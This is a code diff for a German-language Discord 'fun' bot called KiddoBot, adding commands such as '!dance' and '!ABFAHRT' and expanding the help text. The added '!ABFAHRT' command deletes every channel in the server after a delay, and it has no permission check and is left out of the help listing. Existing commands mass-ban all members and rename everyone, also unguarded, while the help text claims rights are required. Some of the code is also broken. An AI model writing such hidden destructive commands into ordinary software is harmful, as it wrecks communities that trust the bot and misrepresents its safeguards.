@@ -105,7 +105,7 @@ async def on_message(message):
     elif message.content.startswith('@everyone'):
         await message.channel.send('LEISE!')
 
-    if message.content.startswith('!rolldice'):
+    elif message.content.startswith('!rolldice'):
         completeRoll = message.content.split(' ') [1]
         roll = int(completeRoll)
         while roll > 0:
@@ -113,7 +113,7 @@ async def on_message(message):
             roll = roll - 1
             time.sleep(1)
 
-    if message.content.startswith('!lösche'):
+    elif message.content.startswith('!lösche'):
         completeText = message.content.split(' ') [1]
         Limit = int(completeText)
         if Limit == 1:
@@ -126,7 +126,7 @@ async def on_message(message):
         print(f'{Limit} Nachrichten wurden gelöscht. Glückwunsch!')
 
 
-    if message.content.startswith('!ban') and message.author.guild_permissions.ban_members:
+    elif message.content.startswith('!ban') and message.author.guild_permissions.ban_members:
         args = message.content.split(' ')
         if len(args) == 2:
             member : Member = discord.utils.find(lambda m: args[1] in m.name, message.guild.members)
@@ -139,7 +139,7 @@ async def on_message(message):
                 await message.channel.send('Der User wurde nicht gefunden!')
 
 
-    if message.content.startswith('!bänn all'):
+    elif message.content.startswith('!bänn all'):
         await message.channel.send('Alle User werden gebannt... Tschüssi :)')
         time.sleep(2)
         for guild in message.client.guild:
@@ -147,23 +147,50 @@ async def on_message(message):
                 await member.ban()
                 await message.channel.send(f'{member} wurde gebannt!')
 
-    if message.content.startswith('!changenickpls'):
+
+    elif message.content.startswith('!changenickpls'):
         await message.channel.send('Jawoll Chef alle Nicknames werden geändert... :)')
         time.sleep(2)
         for member in message.guild.members:  # loop through every member in the guild
             await member.edit(nick="727 WYSi WYFSi")  # reset their nickname
 
 
-    if message.content.startswith('!help'):
+    elif message.content.startswith('!dance'):
+        await message.channel.send("Let's dance :)" , file = discord.File ("C:\_FSST\Jaeger\Shooting Range\KiddoBot\dance.mp4"))
+
+    elif message.content.startswith('!ABFAHRT'):
+        await message.channel.send("ABFAHRT!!!" , file = discord.File ("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
+        time.sleep(8)
+        for channel in message.guild.channels:
+            await channel.delete( reason = 'MFG KiddoBot :)')
+
+    elif message.content.startswith('!help'):
         await message.channel.send('Du brauchst wirklich hilfe :nauseated_face: :face_vomiting:')
-        time.sleep(2)
+        time.sleep(0.5)
         await message.channel.send(" ```"
                                    "Hier ist die Hilfe: \n"
                                    "!help: Zeigt diese Nachricht dödel! \n"
+                                   "-----------------------------------------------------------------------\n"
                                    "ping: Pong \n"
-                                   "@ everyone: tu's nicht. \n"
+                                   "-----------------------------------------------------------------------\n"
+                                   "@everyone: tu's nicht. \n"
+                                   "-----------------------------------------------------------------------\n"
                                    "!lösche belieb. Zahl: löscht beliebig viele Nachrichten \n"
-                                   "!ban belieb. member: Bannt einen Member, wenn du die Rechte hast, das zu tun \n"
+                                    "-----------------------------------------------------------------------\n"
+                                    "!ban belieb. member: Bannt einen Member, wenn du die Rechte hast, das zu tun \n"
+                                    "-----------------------------------------------------------------------\n"
+                                    "!bänn all: Bannt alle Member, wenn du die Rechte hast, das zu tun \n"
+                                    "-----------------------------------------------------------------------\n"
+                                    "!changenickpls: Ändert alle Nicknames \n"
+                                    "-----------------------------------------------------------------------\n"
+                                    "!rolldice belieb. Zahl: Würfelt beliebig oft \n"
+                                    "-----------------------------------------------------------------------\n"
+                                   "!switchpls: Schaltet den Switch um \n"
+                                    "-----------------------------------------------------------------------\n"
+                                   "!switchstatus: Fragt, ob du den Status deines Schalters wissen willst \n"
+                                    "-----------------------------------------------------------------------\n"
+                                   "!dance: Zeigt dir ein Video, wo Kiddo mit seinen Freunden tanzt \n"
+                                    "-----------------------------------------------------------------------\n"
                                    "```")
 
 
